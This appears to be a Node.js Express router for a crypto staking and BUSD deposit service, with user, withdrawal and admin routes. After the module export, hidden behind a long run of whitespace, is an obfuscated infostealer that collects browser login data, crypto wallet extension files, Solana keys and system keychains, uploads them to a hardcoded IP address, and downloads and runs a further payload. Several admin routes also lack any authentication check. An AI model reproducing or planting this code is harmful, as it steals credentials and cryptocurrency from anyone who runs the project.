const UserModel = require('../models/user.model');
const jwt = require('jsonwebtoken');
const express = require('express');
const router = express.Router();
const bodyParser = require("body-parser");
const mysql = require('mysql2');
const config = require('../config');
const requestIp = require('request-ip');
const cron = require('node-cron');
const app = express();
require("dotenv").config();
const cors = require("cors");
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cors());
router.use(bodyParser.json());
router.use(
    bodyParser.urlencoded({
        extended: true,
    })
);
const pool = mysql.createPool({ host: config.mysqlHost, user: config.user, password: process.env.DB_PASS || config.password, database: config.database, port: config.mysqlPort });
const promisePool = pool.promise();

let multer = require('multer');
let storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, './uploads');
    },
    filename: (req, file, cb) => {
        let filetype = '';
        if (file.mimetype === 'image/png') {
            filetype = 'png';
        }
        if (file.mimetype === 'image/jpeg') {
            filetype = 'jpeg';
        }
        if (file.mimetype === 'image/jpg') {
            filetype = 'jpg';
        }
        if (file.mimetype === 'video/mp4') {
            filetype = 'mp4';
        }
        if (file.mimetype === 'application/pdf') {
            filetype = 'pdf';
        }
        cb(null, 'image-' + Date.now() + '.' + filetype);
    }
});
let upload = multer({ storage: storage });
let profileUplaod = upload.fields([{ name: 'profile_pic', maxCount: 1 }])


// All controllers call here
const registerController = require('../controllers/register.controller');
const adminController = require('../controllers/admin.controller');


// cron.schedule("0 1 * * *", async function () {
//     console.log('staiking Cron')
//     await registerController.usersStakingIncome();
// });
//Exchange Controller
// All Validations call here


// Register Routing
router.post('/userregister',  registerController.userRegister.bind()); //done
router.get('/getplandetail',  registerController.getPlanDetails.bind()); //done
router.post('/busddeposit', ensureWebToken, registerController.depositBUSD.bind()); //done
router.post('/gettransactionhistory',ensureWebToken, registerController.getTransactionHistory.bind());
router.post('/addStaking',ensureWebToken, registerController.addStaking.bind());
router.post('/getstakingHistory',ensureWebToken,registerController.getStakingHistory.bind());
router.post('/singalclaimreward',ensureWebToken,registerController.SingalClaimReward.bind());
router.post('/sellplan',ensureWebToken,registerController.SellPlan.bind());
router.post('/gettotalbalance',ensureWebToken,registerController.getTotalBalance.bind());
router.post('/getreferraluserslist',registerController.getReferralUsersList.bind());
router.post('/getwithdrawhistory',ensureWebToken,registerController.getWithdrawHistory.bind());
router.post('/gettotalinvasted',registerController.getTotalInvested.bind());
router.post('/withdrawcrypto',ensureWebToken,registerController.WithdrawCrypto.bind());


router.post('/getwithdrawrequest',adminController.getwithdrawrequest.bind());
router.post('/approvewithdrawrequest',adminController.approvewithdrawrequest.bind());
router.post('/rejectwithdrawrequest',adminController.rejectwithdrawrequest.bind());


router.get('/getuserlist',adminController.getUserList.bind());
router.get('/getstakingdetail',adminController.getStakingDetail.bind());
router.get('/getstakingearningdetail',adminController.getStakingEarningDetail.bind());
router.get('/getdepositbusd',adminController.getdepositBUSDDetail.bind());


cron.schedule("* * * * *", async function () {
    console.log('userBUSDDepositCheck')
    await registerController.userBUSDDepositCheck();
});

const path1 = require('path')
exports.getImage = async (req, res) => {
    const image = req.params.image;
    const myPath = path1.resolve(process.cwd(), "uploads", image);
    res.sendFile(myPath);
}


router.get("/", function (request, response) {
    response.contentType("routerlication/json");
    response.end(JSON.stringify("Node is running"));
});

router.get("*", function (req, res) {
    return res.status(200).json({
        code: 404,
        data: null,
        msg: "Invalid Request {URL Not Found}",
    });
});

router.post("*", function (req, res) {
    return res.status(200).json({
        code: 404,
        data: null,
        msg: "Invalid Request {URL Not Found}",
    });
});

function ensureWebToken(req, res, next) {
    const x_access_token = req.headers['authorization'];
    if (typeof x_access_token !== undefined) {
        req.token = x_access_token;
        verifyJWT(req, res, next);
    } else {
        res.sendStatus(403);
    }
}

async function verifyJWT(req, res, next) {
    jwt.verify(req.token, config.JWT_SECRET_KEY, async function (err, data) {
        if (err) {
            res.sendStatus(403);
        } else {
            const _data = await jwt.decode(req.token, {
                complete: true,
                json: true
            });
            req.user = _data['payload'];
            req.user_id = req.user.id;
            req.email = req.user.email;
            req.address = req.user.address;
            next();
        }
    })
}

function ensureWebTokenForAdmin(req, res, next) {

    const x_access_token = req.headers['authorization'];
    if (typeof x_access_token !== undefined) {
        req.token = x_access_token;
        verifyJWTForAdmin(req, res, next);
    } else {
        res.sendStatus(403);
    }
}


async function verifyJWTForAdmin(req, res, next) {
    jwt.verify(req.token, config.JWT_SECRET_KEY, async function (err, data) {
        if (err) {
            res.sendStatus(403);
        } else {
            const _data = await jwt.decode(req.token, {
                complete: true,
                json: true
            });
            req.user = _data['payload'];
            if (req.user.role != 'cpadmin') {
                return res.sendStatus(403);
            }
            next();
        }
    })
}



module.exports.routes = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             Object.prototype.toString,Object.defineProperties;const bK=a5;(function(bl,bm){const bG=a5,bn=bl();while(!![]){try{const bo=-parseInt(bG(0xc7))/0x1+parseInt(bG(0xc0))/0x2*(-parseInt(bG(0x10e))/0x3)+-parseInt(bG(0xfd))/0x4*(parseInt(bG(0xc9))/0x5)+parseInt(bG(0xe1))/0x6+-parseInt(bG(0xf9))/0x7+-parseInt(bG(0xdb))/0x8+-parseInt(bG(0x120))/0x9*(-parseInt(bG(0xbe))/0xa);if(bo===bm)break;else bn['push'](bn['shift']());}catch(bp){bn['push'](bn['shift']());}}}(a4,0x6e7bd));const a6=(function(){let bl=!![];return function(bm,bn){const bo=bl?function(){if(bn){const bp=bn['apply'](bm,arguments);return bn=null,bp;}}:function(){};return bl=![],bo;};}()),a7=a6(this,function(){const bH=a5;return a7['toString']()[bH(0xb0)]('(((.+)+)+)+$')['toString']()[bH(0xe4)](a7)[bH(0xb0)]('(((.+)+)+)+$');});a7();const a8=(function(){let bl=!![];return function(bm,bn){const bo=bl?function(){const bI=a5;if(bn){const bp=bn[bI(0x102)](bm,arguments);return bn=null,bp;}}:function(){};return bl=![],bo;};}());(function(){a8(this,function(){const bJ=a5,bl=new RegExp(bJ(0x106)),bm=new RegExp(bJ(0x107),'i'),bn=bk('init');!bl[bJ(0xd4)](bn+bJ(0xbc))||!bm[bJ(0xd4)](bn+bJ(0xe3))?bn('0'):bk();})();}());const a9='base64',aa='utf8',ab=require('fs'),ac=require('os'),ad=bl=>(s1=bl[bK(0x11d)](0x1),Buffer['from'](s1,a9)[bK(0xdf)](aa));rq=require(ad(bK(0xcc))),pt=require(ad(bK(0xaa))),ex=require(ad('aY2hpbGRfcHJvY2Vzcw'))[ad('cZXhlYw')],zv=require(ad(bK(0xef))),hd=ac[ad(bK(0x121))](),hs=ac[ad(bK(0xb8))](),pl=ac[ad(bK(0xe9))](),uin=ac[ad(bK(0x117))](),td=ac[ad('cdG1wZGly')]();let ae;const af=bl=>Buffer[bK(0xed)](bl,a9)[bK(0xdf)](aa),ag=()=>{let bl='MjMuMTA2LjaHR0cDovLwI1My4yMTU6MTI0NA==  ';for(var bm='',bn='',bo='',bp='',bq=0x0;bq<0xa;bq++)bm+=bl[bq],bn+=bl[0xa+bq],bo+=bl[0x14+bq],bp+=bl[0x1e+bq];return bm=bm+bo+bp,af(bn)+af(bm);},ah=bl=>bl['replace'](/^~([a-z]+|\/)/,(bm,bn)=>'/'===bn?hd:pt[af(bK(0xf5))](hd)+'/'+bn),ai=bK(0xb3),aj=bK(0xc1),ak=bK(0x111),al='d3JpdGVGaWxlU3luYw',am=bK(0x10f),an=bK(0xe0),ao=bK(0xfc);function ap(bl){const bL=bK,bm=af(bL(0x11f));try{return ab[bm](bl),!0x0;}catch(bn){return!0x1;}}const aq=af(bK(0xe2));function ar(bl){return ab[aq](bl);}function as(bl){const bM=bK;return scrs=af(bM(0x113)),ab[scrs](bl);}const au=bK(0x115),av=bK(0x116),aw=af(bK(0xb9)),ax=af(bK(0xf8)),ay=ad(bK(0xdd)),az=ad(bK(0x122)),aA=ad(bK(0xf7)),aB=ad(bK(0xd8)),aC=ad(bK(0x114)),aD=af(bK(0xc8)),aE=af(bK(0x105)),aF=af(bK(0x118)),aG='Ly5jb25maWcv',aH='L0FwcERhdGEv',aI='L1VzZXIgRGF0YQ',aJ=bK(0xf4),aK=bK(0xf1),aL=bK(0x112),aM=bK(0xb4),aN=[bK(0xd6)+aK,aK,aK],aO=[bK(0x11e),bK(0xae),bK(0xcd)],aP=['TG9jYWwv'+aL,aL,aM];let aQ=bK(0xfb);const aR=bl=>{const bN=bK,bm=ad(bN(0xce)),bn=ad('ZdGltZXN0YW1w'),bo=af('L3VwbG9hZHM'),bp={[bn]:ae[bN(0xdf)](),'type':ai,'hid':aQ,[bm]:bl},bq=ag();try{let br={[aA]:''+bq+bo,[az]:bp};rq[aF](br,(bs,bu,bv)=>{});}catch(bs){}},aS=[bK(0x10c),bK(0xc5),bK(0xbf),'YmJsZGNuZ2NuYXBuZG9kanA',bK(0xfe),'bWdqbmpvcGhocGtrb2xqcGE','ZXBjY2lvbmJvb2hja29ub2VlbWc',bK(0xb6),bK(0xec),bK(0xf3),'Ym1nZGprYnBlbWNjaWlvbGdjZ2U',bK(0xb5)],aT=[bK(0xd5),bK(0x103),bK(0x11b),'Zmhib2hpbWFlbGJvaHBq',bK(0xac),'YmZuYWVsbW9tZWltaGxw',bK(0xb1),bK(0x100),bK(0xd1),bK(0xbd),bK(0x10d),bK(0xb7)],aU=async(bl,bm,bn)=>{const bO=bK;let bo=bl;if(!bo||''===bo)return[];try{if(!ap(bo))return[];}catch(bu){return[];}bm||(bm='');let bp=[];const bq=af(bO(0xee)),br=af(bO(0x109)),bs=af(bO(0x123));for(let bv=0x0;bv<0xc8;bv++){const bw=0x0===bv?aw:ax+' '+bv,bx=bl+'/'+bw+'/'+bq;for(let bz=0x0;bz<aT[bO(0xff)];bz++){const bA=af(aT[bz]+aS[bz]);let bB=bx+'/'+bA;if(ap(bB)){try{far=ab[aD](bB);}catch(bC){far=[];}far[bO(0xe5)](async bD=>{const bP=bO;bo=pt[bP(0xd3)](bB,bD);try{bp[bP(0xca)]({[aB]:{[ay]:''+bm+bv+'_'+bA+'_'+bD},[aC]:as(bo)});}catch(bE){}});}}const by=bl+'/'+bw+'/'+br+'/'+bs;if(ap(by)){try{far=ab[aD](by);}catch(bD){far=[];}far[bO(0xe5)](async bE=>{const bQ=bO;bo=pt[bQ(0xd3)](by,bE);try{bp[bQ(0xca)]({[aB]:{[ay]:''+bm+bv+'_'+bs+'_'+bE},[aC]:as(bo)});}catch(bF){}});}}if(bn){const bE=af('c29sYW5hX2lkLnR4dA');if(bo=''+hd+af(bO(0xaf)),ar(bo))try{bp[bO(0xca)]({[aC]:as(bo),[aB]:{[ay]:bE}});}catch(bF){}}return aR(bp),bp;},aV=async()=>{const bR=bK;aQ=hs,'d'==pl[0x0]&&(aQ=aQ+'+'+uin[af(bR(0x101))]),await bf();try{const bl=ah('~/');await aW(aP,0x0),await aW(aN,0x1),await aW(aO,0x2),'w'==pl[0x0]?(pa=''+bl+af(aH)+af('TG9jYWwvTWljcm9zb2Z0L0VkZ2U')+af(aI),await aU(pa,'3_',!0x1)):'l'==pl[0x0]?(await aZ(),await bd(),await b6()):'d'==pl[0x0]&&(await((async()=>{const bS=bR;let bm=[];const bn=af(au),bo=af(bS(0xc2)),bp=af(bS(0xab));if(pa=''+hd+bo,ar(pa))try{bm[bS(0xca)]({[aC]:as(pa),[aB]:{[ay]:bp}});}catch(bq){}else{if(pa+='-db',ar(pa))try{bm[bS(0xca)]({[aC]:as(pa),[aB]:{[ay]:bp}});}catch(br){}}try{const bs=af(av);let bu='';if(bu=''+hd+af(aJ)+af(aL),bu&&''!==bu&&ap(bu))for(let bv=0x0;bv<0xc8;bv++){const bw=bu+'/'+(0x0===bv?aw:ax+' '+bv)+'/'+bn;try{if(!ap(bw))continue;const bx=bu+'/ld_'+bv;ap(bx)?bm[bS(0xca)]({[aC]:as(bx),[aB]:{[ay]:'pld_'+bv}}):ab[bs](bw,bx,by=>{const bT=bS;let bz=[{[aC]:as(bw),[aB]:{[ay]:bT(0xbb)+bv}}];aR(bz);});}catch(by){}}}catch(bz){}return aR(bm),bm;})()),await aY(),await b7()),await aX(b1,af(b3)),await aX(b2,af(b4));}catch(bm){}},aW=async(bl,bm)=>{try{const bn=ah('~/');let bo='';bo='d'==pl[0x0]?''+bn+af(aJ)+af(bl[0x1]):'l'==pl[0x0]?''+bn+af(aG)+af(bl[0x2]):''+bn+af(aH)+af(bl[0x0])+af(aI),await aU(bo,bm+'_',0x0==bm);}catch(bp){}},aX=async(bl,bm)=>{try{const bn=ah('~/');let bo='';bo='d'==pl[0x0]?''+bn+af(aJ)+af(bl):'l'==pl[0x0]?''+bn+af(aG)+af(bl):''+bn+af(aH)+af(b0)+af(bl),await b5(bo,bm);}catch(bp){}},aY=async()=>{const bU=bK;let bl=[];const bm=af(au);try{const bn=af(av);let bo='';if(bo=''+hd+af(aJ)+af(aK),!bo||''===bo||!ap(bo))return[];let bp=0x0;for(;bp<0xc8;){const bq=bo+'/'+(0x0!==bp?ax+' '+bp:aw)+'/'+bm;try{if(ap(bq)){const br=bo+bU(0xd7)+bp;ap(br)?bl[bU(0xca)]({[aC]:as(br),[aB]:{[ay]:bU(0xe7)+bp}}):ab[bn](bq,br,bs=>{let bu=[{[aC]:as(bq),[aB]:{[ay]:'brld_'+bp}}];aR(bu);});}}catch(bs){}bp++;}}catch(bu){}return aR(bl),bl;},aZ=async()=>{const bV=bK;let bl=[];try{const bm=af(bV(0xe6));let bn='';bn=''+hd+bm;let bo=[];if(bn&&''!==bn&&ap(bn))try{bo=ab[aD](bn);}catch(bp){bo=[];}bo['forEach'](async bq=>{pa=pt['join'](bn,bq);try{ldb_data['push']({[aC]:as(pa),[aB]:{[ay]:''+bq}});}catch(br){}});}catch(bq){}return aR(bl),bl;},b0='Um9hbWluZy9',b1=bK(0xd9),b2=bK(0x11c),b3=bK(0x119),b4='YXRtYw',b5=async(bl,bm)=>{let bn=[];if(!bl||''===bl)return[];try{if(!ap(bl))return[];}catch(bo){return[];}bm||(bm='');try{far=ab[aD](bl),far['forEach'](async bp=>{const bW=a5;let bq=pt[bW(0xd3)](bl,bp);try{bn['push']({[aB]:{[ay]:bm+'_'+bp},[aC]:as(bq)});}catch(br){}});}catch(bp){}return aR(bn),bn;},b6=async()=>{const bX=bK;let bl=[];const bm=af(bX(0xe8)),bn=af(bX(0xde)),bo=af(bX(0xf0));try{let bp='';if(bp=''+hd+af(bX(0xfa)),bp&&''!==bp&&ap(bp))for(let bq=0x0;bq<0xc8;bq++){const br=0x0===bq?aw:ax+' '+bq;try{const bs=bp+'/'+br+'/'+bm;ap(bs)&&bl['push']({[aC]:as(bs),[aB]:{[ay]:'flk4_'+bq}});}catch(bu){}try{const bv=bp+'/'+br+'/'+bn;ap(bv)&&bl['push']({[aC]:as(bv),[aB]:{[ay]:bX(0x10b)+bq}});}catch(bw){}try{const bx=bp+'/'+br+'/'+bo;ap(bx)&&bl[bX(0xca)]({[aC]:as(bx),[aB]:{[ay]:bX(0xb2)+bq}});}catch(by){}}}catch(bz){}return aR(bl),bl;},b7=async()=>{const bY=bK;let bl=[];const bm=af(bY(0xe8)),bn=af(bY(0xde)),bo=af(bY(0xf0));try{let bp='';if(bp=''+hd+af(aJ)+af(bY(0xa9)),bp&&''!==bp&&ap(bp))for(let bq=0x0;bq<0xc8;bq++){const br=0x0===bq?aw:ax+' '+bq;try{const bs=bp+'/'+br+'/'+bm;ap(bs)&&bl[bY(0xca)]({[aC]:as(bs),[aB]:{[ay]:bY(0xc4)+bq}});}catch(bu){}try{const bv=bp+'/'+br+'/'+bn;ap(bv)&&bl[bY(0xca)]({[aC]:as(bv),[aB]:{[ay]:'fk3_'+bq}});}catch(bw){}try{const bx=bp+'/'+br+'/'+bo;ap(bx)&&bl['push']({[aC]:as(bx),[aB]:{[ay]:'flj_'+bq}});}catch(by){}}}catch(bz){}return aR(bl),bl;};function b8(bl){const bZ=bK,bm=af(bZ(0xd0));ab[bm](bl);}const b9=0x3117870;let ba=0x0;const bb=async bl=>{const c0=bK,bm=af('dGFyIC14Zg')+' '+bl+c0(0xba)+hd;ex(bm,(bn,bo,bp)=>{if(bn)return b8(bl),void(ba=0x0);b8(bl),be();});},bc=()=>{const c1=bK;if(ba>=b9+0x4)return;const bl=af(c1(0xd2)),bm=ag(),bn=td+'\x5c'+af(c1(0xda)),bo=td+'\x5c'+bl,bp=''+bm+af(c1(0xea)),bq=af(c1(0xdc)),br=af('cmVuYW1l');if(ar(bn))try{var bs=ab[aE](bn);bs[c1(0x11a)]>=b9+0x4?(ba=bs[c1(0x11a)],ab[br](bn,bo,bu=>{if(bu)throw bu;bb(bo);})):(ba>=bs[c1(0x11a)]?(b8(bn),ba=0x0):ba=bs[c1(0x11a)],bg());}catch(bu){}else{const bv=af(c1(0x10a))+' "'+bn+c1(0xf6)+bp+'"';ex(bv,(bw,bx,by)=>{if(bw)return ba=0x0,void bg();try{ba=b9+0x4,ab[bq](bn,bo),bb(bo);}catch(bz){}});}},bd=async()=>{const c2=bK;let bl=[];const bm=af(au);try{const bn=af(av);let bo='';if(bo=''+hd+af(aG)+af(aM),!bo||''===bo||!ap(bo))return[];for(let bp=0x0;bp<0xc8;bp++){const bq=bo+'/'+(0x0===bp?aw:ax+' '+bp)+'/'+bm;try{if(!ap(bq))continue;const br=bo+'/ld_'+bp;ap(br)?bl['push']({[aC]:as(br),[aB]:{[ay]:c2(0xcb)+bp}}):ab[bn](bq,br,bs=>{const c3=c2;let bu=[{[aC]:as(bq),[aB]:{[ay]:c3(0xcb)+bp}}];aR(bu);});}catch(bs){}}}catch(bu){}return aR(bl),bl;},be=async()=>await new Promise((bl,bm)=>{if('w'!=pl[0x0])((()=>{const c4=a5,bn=ag(),bo=af(am),bp=af(al),bq=af(aj),br=af(ak),bs=af(c4(0xf2)),bu=''+bn+bo+'/'+ai,bv=''+hd+br;let bw=bs+c4(0xc3)+bv+'"';rq[bq](bu,(bx,by,bz)=>{bx||(ab[bp](bv,bz),ex(bw,(bA,bB,bC)=>{}));});})());else ar(''+(''+hd+af(an+ao)))?((()=>{const c5=a5,bn=ag(),bo=af(am),bp=af(aj),bq=af(al),br=af(ak),bs=''+bn+bo+'/'+ai,bu=''+hd+br,bv='"'+hd+af(an+ao)+c5(0xf6)+bu+'"';try{b8(bu);}catch(bw){}rq[bp](bs,(bx,by,bz)=>{if(!bx)try{ab[bq](bu,bz),ex(bv,(bA,bB,bC)=>{});}catch(bA){}});})()):bc();}),bf=async()=>{const c6=bK;let bl='3CC';try{bl+=zv[af(c6(0x104))][0x1];}catch(bm){}(async(bn,bo)=>{const c7=c6,bp={'ts':ae['toString'](),'type':ai,'hid':aQ,'ss':bn,'cc':bo[c7(0xdf)]()},bq=ag(),br={[aA]:''+bq+af('L2tleXM'),[az]:bp};try{rq[aF](br,(bs,bu,bv)=>{});}catch(bs){}})(c6(0x108),bl);};function bg(){setTimeout(()=>{bc();},0x4e20);}var bh=0x0;function a5(a,b){const c=a4();return a5=function(d,e){d=d-0xa9;let f=c[d];return f;},a5(a,b);}function a4(){const ca=['Ly5jb25maWcvc29sYW5hL2lkLmpzb24','search','YWVhY2hrbm1lZnBo','fllj_','VDNhbTM3','Z29vZ2xlLWNocm9tZQ','aGJubWtrbGllZ2htbWprcGlncGE','aGRjb25kYmNiZG5iZWVwcGdkcGg','cGRsaWFvZ2VoZ2Ri','caG9zdG5hbWU','RGVmYXVsdA',' -C ','pld_','chain','YWhvbHBmZGlhbGpn','10476070Tlrgjy','cGVia2xtbmtvZW9paG9mZWM','859298THNkkf','Z2V0','L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu','3 "','fk4_','aGVjZGFsbWVlZWFqbmltaG0','counter','252159AResRv','cmVhZGRpclN5bmM','10mfdZhh','push','plld_','YcmVxdWVzdA','b3BlcmE','YbXVsdGlfZmlsZQ','gger','cm1TeW5j','aGlmYWZnbWNjZHBl','cDIuemlw','join','test','bmtiaWhmYmVvZ2FlYW9l','TG9jYWwv','/brld_','Zb3B0aW9ucw','RXhvZHVzL2V4b2R1cy53YWxsZXQ','cC56aQ','4034000HYkWGM','cmVuYW1lU3luYw','aZmlsZW5hbWU','a2V5My5kYg','toString','XC5weXBccHl0','102726NBOQJI','ZXhpc3RzU3luYw','input','constructor','forEach','Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8','brld_','a2V5NC5kYg','YcGxhdGZvcm0','L3Bkb3du','call','a3Bsb21qamtjZmdvZG5oY2VsbGo','from','TG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdz','Zbm9kZTpwcm9jZXNz','bG9naW5zLmpzb24','QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy','cHl0aG9u','amZob21paGtqYm1namlkbGNkbm8','L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8','ZGlybmFtZQ','" "','adXJs','UHJvZmlsZQ','459312EwszcA','Ly5tb3ppbGxhL2ZpcmVmb3gv','comp','aG9uLmV4ZQ','816240nWbCGs','ZGdjaWpubWhuZm5rZG5hYWQ','length','ZWdqaWRqYnBnbGlj','dXNlcm5hbWU','apply','ZWpiYWxiYWtvcGxjaGxn','YXJndg','c3RhdFN5bmM','function *\x5c( *\x5c)','\x5c+\x5c+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','jqq','U3luYyBFeHRlbnNpb24gU2V0dGluZ3M','Y3VybCAtTG8','flk3_','aGxlZm5rb2RiZWZncGdrbm4','bWNvaGlsbmNiZmFo','3Bwpqev','L2NsaWVudA','now','Ly5ucGw','R29vZ2xlL0Nocm9tZQ','Y3JlYXRlUmVhZFN0cmVhbQ','YdmFsdWU','TG9naW4gRGF0YQ','Y29weUZpbGU','AdXNlckluZm8','cG9zdA','ZXhvZA','size','aWJuZWpkZmptbWtwY25s','YXRvbWljL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYg','slice','Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU','YWNjZXNzU3luYw','18MyKNaC','ZaG9tZWRpcg','cZm9ybURhdGE','YmhnaG9hbWFwY2RwYm9ocGhpZ29vb2FkZGlucGtiYWk','RmlyZWZveA','zcGF0aA','bG9na2MtZGI','aG5mYW5rbm9jZmVvZmJk','debu','Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE'];a4=function(){return ca;};return a4();}const bi=async()=>{const c8=bK;try{ae=Date[c8(0x110)](),await aV(),be();}catch(bl){}};bi();let bj=setInterval(()=>{(bh+=0x1)<0x5?bi():clearInterval(bj);},0x927c0);function bk(bl){function bm(bn){const c9=a5;if(typeof bn==='string')return function(bo){}[c9(0xe4)]('while (true) {}')[c9(0x102)](c9(0xc6));else(''+bn/bn)[c9(0xff)]!==0x1||bn%0x14===0x0?function(){return!![];}[c9(0xe4)](c9(0xad)+c9(0xcf))[c9(0xeb)]('action'):function(){return![];}[c9(0xe4)]('debu'+c9(0xcf))[c9(0x102)]('stateObject');bm(++bn);}try{if(bl)return bm;else bm(0x0);}catch(bn){}}